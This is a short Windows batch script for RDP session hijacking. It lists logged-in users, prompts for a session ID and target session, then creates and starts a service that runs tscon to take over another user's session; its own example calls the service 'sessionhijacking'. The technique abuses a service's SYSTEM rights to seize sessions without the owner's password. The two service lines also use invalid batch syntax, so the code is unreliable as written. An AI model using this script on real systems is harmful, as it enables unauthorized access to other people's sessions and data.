@echo off
:Ask

query user
set /p id=Enter ID Number:
set /p sn=Enter Session Name:
set /p an=Enter Any Name of Session (example:sessionhijacking):
%serv% = sc create %an% binpath= "cmd.exe /k tscon %id% /dest:%sn%"
%se% = net start %an%